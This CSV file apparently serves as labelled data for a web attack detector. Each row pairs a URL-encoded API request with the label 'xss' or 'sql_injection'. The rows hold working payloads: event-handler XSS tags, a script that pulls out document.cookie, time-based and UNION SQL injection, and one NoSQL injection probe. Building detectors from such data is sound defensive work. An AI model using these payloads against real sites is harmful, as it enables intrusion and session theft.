text,label
/api/v2/comments/%3Cwbr+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fwbr%3E,xss
/api/v1/comments?text=%3Cstyle+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstyle%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cinput+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Finput%3E,xss
/api/v2/comments/%3Cmark+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmark%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Ckeygen+autofocus+onfocus%3Dalert%281%29%3E,xss
/v1/profile?bio=%3Chgroup+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhgroup%3E,xss
/v1/profile?bio=%3Chtml+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhtml%3E,xss
/api/v1/login?username=%27&password=pass,sql_injection
/api/v2/comments/%3Cslot+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fslot%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cmap+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmap%3E,xss
/api/v2/comments/%3Cscript%3E+var%2BxmlHttp%2B%3D%2Bnull%3B+try%2B%7B+xmlHttp%2B%3D%2Bnew%2BXMLHttpRequest%28%29%3B+%7D%2Bcatch%28e%29%2B%7B%7D+if%2B%28xmlHttp%29%2B%7B+xmlHttp.open%28%27GET%27%2C%2B%27%2Fxssme2%27%2C%2Btrue%29%3B+xmlHttp.onreadystatechange%2B%3D%2Bfunction%2B%28%29%2B%7B+if%2B%28xmlHttp.readyState%2B%3D%3D%2B4%29%2B%7B+xmlHttp.responseText.match%28%2Fdocument.cookie%255Cs%252B%3D%255Cs%252B%27%28.%2A%29%27%2Fgi%29%3B+alert%28RegExp.%25241%29%3B+%7D+%7D+xmlHttp.send%28null%29%3B+%7D%3B+%3C%2Fscript%3E%23,xss
/api/v2/comments/%3Cxmp+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fxmp%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cparam+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fparam%3E,xss
/api/v1/comments?text=%3C%2Fimage%3E,xss
/api/v1/feedback?message=%3Ci+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fi%3E,xss
/v1/search?q=%3Csvg%3E%3Cscript%3E%2F%2F,xss
/api/v1/comments?text=%3Cx+contenteditable+onkeydown%3Dalert%281%29%3Epress+any+key%21,xss
/api/v1/comments?text=%3Cframe+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframe%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cu+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fu%3E,xss
/v1/profile?bio=%3Cmeter+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fmeter%3E,xss
/api/v1/login?username=%27%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&password=pass,sql_injection
/api/v1/feedback?message=%3Ctfoot+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftfoot%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24--&status=active,sql_injection
/api/v1/comments?text=%3Ctr+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/api/v1/feedback?message=%3Cslot+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fslot%3E,xss
/api/v1/login?username=%27+%7D+%5D%2C+%24comment%3A%27successful+MongoDB+injection%27&password=pass,sql_injection
/api/v2/comments/%3Cbody+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fbody%3E,xss
